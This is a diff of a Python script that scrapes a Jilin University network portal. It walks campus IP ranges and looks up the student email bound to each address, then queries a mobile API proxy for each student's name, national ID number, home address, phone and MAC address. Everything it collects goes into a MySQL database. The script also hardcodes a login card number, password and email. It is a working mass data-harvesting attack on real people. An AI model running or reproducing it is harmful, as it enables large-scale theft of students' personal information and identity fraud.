@@ -1,11 +1,18 @@
 import requests
+import json
 from PIL import Image
+import pymysql.cursors
 from pytesseract import image_to_string
 from random import randint
 import re
 import time
 
+connect_data = open("/home/db.txt")
+data = connect_data.read().split('\n')
+connections = pymysql.connect(host=data[0], user=data[1], password=data[2], database='studentip', charset=data[4])
+
 # 从ip范围得到ip
+ip_addresses = []
 
 
 def ip_generator():
@@ -17,12 +24,11 @@ def ip_generator():
             for i in range(int(floor[2]), int(ceiling[2])+1):
                 for j in range(int(floor[3]), int(ceiling[3])+1):
                     ip = '.'.join(floor[:2]+[str(i), str(j)])
-                    yield ip
-inters = ip_generator()
+                    ip_addresses.append(ip)
 flag = 0
 # login
-card = '+++++++++++'
-pwd = '》》》》》》》》'
+card = '20150108849'
+pwd = '109308'
 while True:
     flag = 0
     time.sleep(10)
@@ -70,9 +76,9 @@ while True:
 
         headers['Referer'] = 'https://ip.jlu.edu.cn/pay/guanlian.php?menu=add_ip'
         # 查询2000次后重新打开会话
-        while flag < 2000:
+        while flag < 1000:
             flag = flag + 1
-            ip = next(inters)
+            ip = ip_addresses[0]
             print(ip)
             post_url = 'https://ip.jlu.edu.cn/pay/guanlian.php?'
             post_data = 'menu=save_add_ip&ip=' + ip + '&mail=chenzhuo2016%40mails.jlu.edu.cn'
@@ -84,14 +90,46 @@ while True:
             result = response.content.decode('gbk')
 
             mail = pattern.findall(result)
-
+            print(mail)
             if mail:
-                f = open('c.txt', 'a+')
-                f.write(mail[0] + '\t' + ip + '\n')
-                f.close()
-                print('%s----------------------------------------------------' % mail[0])
-    except Exception as e:
-        print(e)
-        time
+                mail = mail[0]
+                info_url = 'http://202.98.18.57:18080/webservice/m/api/proxy'
+                postdata = 'link=http%3A%2F%2Fip.jlu.edu.cn%2Fpay%2Finterface_mobile.php%3Fmenu%3Dget_mail_info%26mail%3D' \
+                           + mail
+                postdata = postdata.encode()
+                headers = {
+                    'Cookie': 'JSESSIONID=' + '',
+                    'Accept-Encoding': 'gzip, deflate',
+                    'Accept': '*/*',
+                    'User-Agent': 'mjida/2.41 CFNetwork/808.2.16 Darwin/16.3.0',
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
 
+                result = session.post(info_url, postdata, headers=headers).content.decode()
+                result = json.loads(result)
+                stu_info = result['resultValue']['content']
+                stu_info = json.loads(stu_info)
+                ip = stu_info.get('ip', [''])[0]
+                ip_info = stu_info.get('ip_info', {}).get(ip, {})
+                infos = [
+                    stu_info.get('mail', mail),
+                    stu_info.get('name', ' '),
+                    stu_info.get('zhengjianhaoma', ' '),
+                    stu_info.get('class', ''),
+                    ip,
+                    ip_info.get('id_name', ' '),
+                    ip_info.get('campus', ' '),
+                    ip_info.get('net_area', ' '),
+                    ip_info.get('home_addr', ' '),
+                    ip_info.get('phone', ' '),
+                    ip_info.get('mac', ' ')
+                ]
+                with connections.cursor() as cursor:
+                    cursor.execute('insert into stu values(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);', infos)
+                    connections.commit()
+            ip_addresses.append(ip_addresses.pop(0))
+    except Exception as e:
+        ip_addresses.append(ip_addresses.pop(0))
+        print(e)
+        time.sleep(20)
 
